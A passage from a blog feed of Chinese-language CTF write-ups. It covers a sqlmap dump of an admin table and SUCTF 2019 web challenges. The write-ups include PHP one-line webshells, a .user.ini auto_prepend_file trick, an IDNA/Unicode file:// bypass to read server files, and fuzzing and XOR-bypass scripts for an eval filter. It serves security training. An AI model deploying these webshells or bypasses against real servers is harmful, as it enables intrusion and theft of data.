shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">sqlmap -r 1.txt --tamper=space2comment -p username -D injection -T admin --columns</span><br><br>web application technology: PHP 5.6.21, Apache 2.4.18<br>back-end DBMS: MySQL &gt;= 5.0.12<br>[17:33:26] [INFO] fetching columns for table &#x27;admin&#x27; in database &#x27;injection&#x27;<br>[17:33:26] [INFO] resumed: 3<br>[17:33:26] [INFO] resumed: id<br>[17:33:26] [INFO] resumed: int(11)<br>[17:33:26] [INFO] resumed: username<br>[17:33:26] [INFO] resumed: varchar(255)<br>[17:33:26] [INFO] resumed: password<br>[17:33:26] [INFO] resumed: varchar(255)<br>Database: injection<br>Table: admin<br>[3 columns]<br>+----------+--------------+<br>| Column   | Type         |<br>+----------+--------------+<br>| id       | int(11)      |<br>| password | varchar(255) |<br>| username | varchar(255) |<br>+----------+--------------+<br></code></pre></td></tr></table></figure><p>çœ‹åˆ°æœ‰ä¸‰ä¸ªå­—æ®µ <code>id</code>, <code>username</code> , <code>password</code> , ç›´æ¥ dump å‡ºæ¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">sqlmap -r 1.txt --tamper=space2comment -p username -D injection -T admin -C <span class="hljs-string">&quot;id,username,password&quot;</span> --dump</span><br><br>Database: injection<br>Table: admin<br>[1 entry]<br>+----+----------+----------------------------------+<br>| id | username | password                         |<br>+----+----------+----------------------------------+<br>| 1  | admin    | 334cfb59c9d74849801d5acdcfdaadc3 |<br>+----+----------+----------------------------------+<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¾—åˆ° admin çš„å¯†ç ï¼Œçœ‹æ ·å­æ˜¯ä¸€ä¸ª md5 çš„å€¼ï¼Œæˆ‘ä»¬ä¸Šç½‘æœä¸€ä¸‹ï¼Œå¾—åˆ°ç»“æœ <code>eTAloCrEP</code></p><p>ç™»å½• admin å’Œå¯†ç ç›´æ¥ç™»å½•ï¼Œå¾—åˆ° flag</p><h1 id="To-be-continueâ€¦"><a href="#To-be-continueâ€¦" class="headerlink" title="To be continueâ€¦"></a>To be continueâ€¦</h1>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WriteUps</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web WriteUps for SUCTF2019</title>
    <link href="/2019/08/26/SUCTF2019_WriteUp/"/>
    <url>/2019/08/26/SUCTF2019_WriteUp/</url>
    
    <content type="html"><![CDATA[<h1 id="SUCTF-2019"><a href="#SUCTF-2019" class="headerlink" title="SUCTF 2019"></a>SUCTF 2019</h1><h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p>é¢˜ç›®æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¢˜ç›®ï¼Œ</p><p>å…ˆéšä¾¿ä¸Šä¼ ä¸€ä¸ªé©¬ä¸Šå»ï¼Œå‘ç°æ˜¾ç¤ºï¼š<br><img src="https://s2.ax1x.com/2020/02/12/17nPH0.png" alt="17nPH0.png"></p><p>çŒœæµ‹ä½¿ç”¨äº† <code>exif_imagetype()</code> å‡½æ•°ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥åŠ æ–‡ä»¶å¤´å¦‚ <code>GIF89a</code> å³å¯ç»•è¿‡ã€‚</p><p>ç„¶åå†ä¸Šä¼ ä¸ªå›¾ç‰‡é©¬ï¼Œä¸€å¥è¯ä¸º <code>&lt;?php @eval($_POST[hz]);?&gt;</code>ï¼Œå‘ç°æç¤ºï¼š</p><p><img src="https://s2.ax1x.com/2020/02/12/17nFEV.png" alt="17nFEV.png"></p><p>ä¹Ÿå°±æ˜¯è¿‡æ»¤äº† <code>&lt;?</code>ï¼Œæˆ‘ä»¬æ¢<code>script</code>é©¬<code>&lt;script language=&#39;php&#39;&gt;eval($_REQUEST[hz]);&lt;/script&gt;</code>ï¼Œä¸Šä¼ æˆåŠŸäº†ã€‚</p><p><img src="https://s2.ax1x.com/2020/02/12/17nkNT.png" alt="17nkNT.png"></p><p>å¹¶ä¸”å‘Šè¯‰æˆ‘ä»¬ä¸Šä¼ çš„è·¯å¾„ï¼Œæˆ‘ä»¬è®¿é—®å›¾ç‰‡å‘ç°åˆæ˜¯ä¸€ä¸ªä¸Šä¼ ç•Œé¢ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°ä¸Šä¼ æ–‡ä»¶å¤¹ä¸­åŒ…å« <code>index.php</code>ï¼Œä¸”è¿™é‡Œæ˜¯ <code>nginx</code> ï¼Œå¯ä»¥ä¸Šä¼  <code>.user.ini</code>ï¼Œæ¥è®¾ç½®è§£æï¼Œä»€ä¹ˆæ˜¯<code>.user.ini</code>ï¼Ÿè§<a href="http://www.vuln.cn/6001">å‚è€ƒèµ„æ–™</a>ï¼Œæˆ‘ä»¬å¯ä»¥å€ŸåŠ©.user.iniè½»æ¾è®©æ‰€æœ‰phpæ–‡ä»¶éƒ½â€œè‡ªåŠ¨â€åŒ…å«æŸä¸ªæ–‡ä»¶ï¼Œè€Œè¿™ä¸ªæ–‡ä»¶å¯ä»¥æ˜¯ä¸€ä¸ªæ­£å¸¸phpæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªåŒ…å«ä¸€å¥è¯çš„webshellã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å†™ä¸€ä¸ª <code>.user.ini</code></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini">GIF89a<br><span class="hljs-attr">auto_prepend_file</span>=shell.gif<br></code></pre></td></tr></table></figure><p>å†™äº†æ–‡ä»¶å¤´ï¼Œä¸Šä¼ æˆåŠŸã€‚æ¥ä¸‹æ¥æˆ‘ä»¬å†™ä¸€ä¸ªåä¸º <code>shell.gif</code> çš„å›¾ç‰‡é©¬ï¼Œä¸Šä¼ ä¸Šå»ï¼Œæˆ‘ä»¬åŒæ ·ç”¨ <code>script</code> é©¬ï¼Œä¸Šä¼ åï¼Œç›´æ¥è®¿é—® <code>uploads/xxxxxxxxxxxxxxx/index.php?system(&#39;cat /flag&#39;);</code>å³å¯å¾—åˆ° flagã€‚</p><h2 id="Pythonginx"><a href="#Pythonginx" class="headerlink" title="Pythonginx"></a>Pythonginx</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/getUrl&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getUrl</span>():<br>    url = request.args.get(<span class="hljs-string">&quot;url&quot;</span>)<br>    host = parse.urlparse(url).hostname<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 111&quot;</span><br>    parts = <span class="hljs-built_in">list</span>(urlsplit(url))<br>    host = parts[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 222 &quot;</span> + host<br>    newhost = []<br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">&#x27;.&#x27;</span>):<br>        newhost.append(h.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    parts[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;.&#x27;</span>.join(newhost)<br>    <span class="hljs-comment">#å»æ‰ url ä¸­çš„ç©ºæ ¼</span><br>    finalUrl = urlunsplit(parts).split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>]<br>    host = parse.urlparse(finalUrl).hostname<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> urllib.request.urlopen(finalUrl).read()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 333&quot;</span><br></code></pre></td></tr></table></figure><p>æœ¬åœ°å¤§æ¦‚ç†äº†ä¸€ä¸‹ä»£ç åŠŸèƒ½ <code>url=http://suctf.ccc/?id=1#123</code></p><p><img src="https://s2.ax1x.com/2020/02/12/17ndbt.png" alt="17ndbt.png"></p><p>é€šè¿‡æºç åˆ†æå¯ä»¥çŸ¥é“å¤§æ¦‚çš„æ€è·¯æ˜¯åˆ©ç”¨ <code>file://</code> å»è¯»æ–‡ä»¶ï¼ŒåŒæ—¶hostnameä¸èƒ½æ˜¯<code>suctf.cc</code>ï¼Œç„¶åæ³¨æ„åˆ°<code>newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</code>ï¼Œåœ¨githubä¸Šæœ‰ä¸€ç¯‡ä¸œè¥¿ã€‚</p><blockquote><p><a href="https://github.com/python-hyper/hyperlink/issues/19">https://github.com/python-hyper/hyperlink/issues/19</a></p></blockquote><p>ä¸Šé¢çš„å­—ç¬¦å¯ä»¥ä»£è¡¨ <code>c/o</code>ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ„é€  <code>suctf.cc/opt/../../</code> è¯»å–æ–‡ä»¶ï¼Œå½“ç„¶è¿˜æœ‰å…¶å®ƒç¼–ç ä¹Ÿå¯ä»¥ï¼Œå…¶å®é¢„æœŸæ˜¯åˆ©ç”¨ unicode2ascii çš„åŸŸåè½¬æ¢å¯¼è‡´çš„è§£æé—®é¢˜ï¼Œåœ¨ blackhat <a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization</a> ä¸­æœ‰æåˆ°ã€‚</p><p><img src="https://s2.ax1x.com/2020/02/12/17n0VP.png" alt="17n0VP.png"></p><p>ä¹Ÿå°±æ˜¯æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥é€šè¿‡ punycode è½¬ä¸º <code>c</code> çš„å­—ç¬¦ï¼Œå¼•ç”¨<code>de1ta</code>çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse,urlunsplit,urlsplit<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_unicode</span>():<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">65536</span>):<br>        uni=<span class="hljs-built_in">chr</span>(x)<br>        url=<span class="hljs-string">&quot;http://suctf.c&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(uni)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> getUrl(url):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;str: &quot;</span>+uni+<span class="hljs-string">&#x27; unicode: \\u&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(x))[<span class="hljs-number">2</span>:])<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getUrl</span>(<span class="hljs-params">url</span>):<br>    url = url<br>    host = parse.urlparse(url).hostname<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    parts = <span class="hljs-built_in">list</span>(urlsplit(url))<br>    host = parts[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    newhost = []<br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">&#x27;.&#x27;</span>):<br>        newhost.append(h.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    parts[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;.&#x27;</span>.join(newhost)<br>    finalUrl = urlunsplit(parts).split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>]<br>    host = parse.urlparse(finalUrl).hostname<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    get_unicode()<br></code></pre></td></tr></table></figure><p>å¯å¾—å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span>: â„‚ unicode: \u2102<br><span class="hljs-built_in">str</span>: â„­ unicode: \u212d<br><span class="hljs-built_in">str</span>: â…­ unicode: \u216d<br><span class="hljs-built_in">str</span>: â…½ unicode: \u217d<br><span class="hljs-built_in">str</span>: â’¸ unicode: \u24b8<br><span class="hljs-built_in">str</span>: â“’ unicode: \u24d2<br><span class="hljs-built_in">str</span>: ï¼£ unicode: \uff23<br><span class="hljs-built_in">str</span>: ï½ƒ unicode: \uff43<br></code></pre></td></tr></table></figure><p>ä»»ä¸€å¯ä»¥é€šè¿‡æ£€æµ‹ã€‚</p><p>ç„¶åæˆ‘ä»¬é€šè¿‡å®¡è®¡ç½‘é¡µçš„æºä»£ç ï¼Œå¯ä»¥å‘ç°æç¤ºäº†<code>nginx</code>ï¼Œæˆ‘ä»¬å»è¯»ä¸€ä¸‹<code>nginx</code>çš„é…ç½®æ–‡ä»¶ï¼š</p><p><code>file://suctf.cï¼£/../../../../usr/local/nginx/conf/nginx.conf</code></p><p><img src="https://s2.ax1x.com/2020/02/12/17ny8g.png" alt="17ny8g.png"></p><p>å¯ä»¥æ‰¾åˆ°flagçš„è·¯å¾„ï¼Œæ¥ä¸‹æ¥ç›´æ¥è¯»å–flagï¼š</p><p><code>file://suctf.cï¼£/../../../../usr/fffffflag</code></p><h2 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h2><p>è¿™é¢˜æ˜¯ä»£ç å®¡è®¡ï¼Œä¸€çœ‹å°±æ˜¯å„ç§ç»•ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_the_flag</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">// webadmin will remove your upload file every 20 min!!!! </span><br>    <span class="hljs-variable">$userdir</span> = <span class="hljs-string">&quot;upload/tmp_&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$userdir</span>))&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$userdir</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]))&#123;<br>        <span class="hljs-variable">$tmp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];<br>        <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>        <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ph/i&quot;</span>,<span class="hljs-variable">$extension</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$tmp_name</span>), <span class="hljs-string">&#x27;&lt;?&#x27;</span>)!==False) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-variable">$tmp_name</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <br>        <span class="hljs-variable">$path</span>= <span class="hljs-variable">$userdir</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$name</span>;<br>        @<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-variable">$path</span>);<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$path</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$hhh</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;_&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$hhh</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hhh</span>)&gt;<span class="hljs-number">18</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;One inch long, one inch strong!&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="hljs-variable">$hhh</span>) )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try something else!&#x27;</span>);<br><br><span class="hljs-variable">$character_type</span> = <span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-variable">$hhh</span>, <span class="hljs-number">3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$character_type</span>)&gt;<span class="hljs-number">12</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Almost there!&quot;</span>);<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$hhh</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>é¦–å…ˆå¤§æ¦‚è¦ç»•è¿‡çš„ç‚¹ï¼š</p><ol><li>ä¼ å…¥å­—ç¬¦é•¿åº¦å¯ä»¥æ„é€  <code>_GET[x]</code> æ¥ç»•è¿‡</li><li><code>preg_match</code> å¯ä»¥é€šè¿‡å¼‚æˆ–æ¥ç»•è¿‡</li><li><code>count_chars()&gt;12</code> çš„é‡å¤å­—ç¬¦ä¸²ç»•è¿‡</li></ol><p><code>$hhh</code> çš„é•¿åº¦ä¸èƒ½è¶…è¿‡18ï¼Œå…¶æ¬¡ï¼Œçœ‹ä¸€ä¸‹è¿™ä¸ªæ­£åˆ™åŒ¹é…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="hljs-variable">$hhh</span>)<br></code></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬å¯ä»¥å†™è„šæœ¬æ¥ Fuzz ä¸€ä¸‹å¯ç”¨çš„æœ‰å“ªäº›ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env</span><br><span class="hljs-comment">#encoding=utf-8</span><br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>url = <span class="hljs-string">&#x27;http://ip/?_=&#x27;</span> <span class="hljs-comment"># å…·ä½“ç¯å¢ƒurl</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>r = requests.get(url=url+<span class="hljs-built_in">chr</span>(i))<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(r.text) != <span class="hljs-number">19</span>:<br><span class="hljs-keyword">if</span> i &gt; <span class="hljs-number">127</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(i), end=<span class="hljs-string">&#x27; &#x27;</span>) <span class="hljs-comment"># ä¸å¯è§å­—ç¬¦ç”¨hex</span><br><span class="hljs-keyword">else</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i), end=<span class="hljs-string">&#x27; &#x27;</span>) <span class="hljs-comment"># å¯è§å­—ç¬¦ç›´æ¥æ‰“å°</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br></code></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸€ä¸‹å¯ç”¨çš„å­—ç¬¦ã€‚</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">! # $ <span class="hljs-comment">% &amp; ( ) * - / 0 : ; &lt; &gt; ? @ \ ] ^ &#123; &#125; 0x80 0x81 0x82 0x83 0x84 0x85 0x86 0x87 0x88 0x89 0x8a 0x8b 0x8c 0x8d 0x8e 0x8f 0x90 0x91 0x92 0x93 0x94 0x95 0x96 0x97 0x98 0x99 0x9a 0x9b 0x9c 0x9d 0x9e 0x9f 0xa0 0xa1 0xa2 0xa3 0xa4 0xa5 0xa6 0xa7 0xa8 0xa9 0xaa 0xab 0xac 0xad 0xae 0xaf 0xb0 0xb1 0xb2 0xb3 0xb4 0xb5 0xb6 0xb7 0xb8 0xb9 0xba 0xbb 0xbc 0xbd 0xbe 0xbf 0xc0 0xc1 0xc2 0xc3 0xc4 0xc5 0xc6 0xc7 0xc8 0xc9 0xca 0xcb 0xcc 0xcd 0xce 0xcf 0xd0 0xd1 0xd2 0xd3 0xd4 0xd5 0xd6 0xd7 0xd8 0xd9 0xda 0xdb 0xdc 0xdd 0xde 0xdf 0xe0 0xe1 0xe2 0xe3 0xe4 0xe5 0xe6 0xe7 0xe8 0xe9 0xea 0xeb 0xec 0xed 0xee 0xef 0xf0 0xf1 0xf2 0xf3 0xf4 0xf5 0xf6 0xf7 0xf8 0xf9 0xfa 0xfb 0xfc 0xfd 0xfe 0xff </span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è€ƒè™‘å˜é‡ï¼Œå› ä¸ºè¿˜æœ‰ <code>$</code>ï¼Œç„¶åæœ€çŸ­çš„å˜é‡å°±æ˜¯ <code>$_GET</code>ï¼Œåœ¨æµè§ˆå™¨ä¸­è¿™äº›å­—ç¬¦éƒ½æ˜¯æ•æ„Ÿå­—ç¬¦ï¼Œå¦‚æœä¸åŠ å•å¼•å·åŒå¼•å·ï¼Œæµè§ˆå™¨å°±æŠŠä»–ä»¬ç”¨èµ·æ¥äº†ï¼ˆæµè§ˆå™¨è¿›è¡Œè§£æï¼Œè€Œä¸æ˜¯phpè¯­è¨€ï¼‰æ‰€ä»¥æˆ‘ä»¬è¦ä½¿ç”¨ä¸å¯è§†çš„å­—ç¬¦æ¥è¿›è¡Œå¼‚æˆ–è„šæœ¬çš„åŸºç¡€å­—å…¸ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ç½‘ä¸Šå·çš„è„šæœ¬</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">XOR</span>():<br>_=[]<br>G=[]<br>E=[]<br>T=[]<br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a[<span class="hljs-number">27</span>:]:<span class="hljs-comment"># æˆªå–aåˆ—è¡¨27åé¢çš„æ•°æ®ï¼Œç›®çš„æ˜¯é¿å¼€å¯è§†å­—ç¬¦ã€‚æˆ‘ä»¬éœ€è¦ä¸å¯è§†å­—ç¬¦æ¥å¼‚æˆ–</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> a[<span class="hljs-number">27</span>:]:<br>tem = (i ^ j)<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">chr</span>(tem) == <span class="hljs-string">&quot;_&quot;</span>):<br>_.append((<span 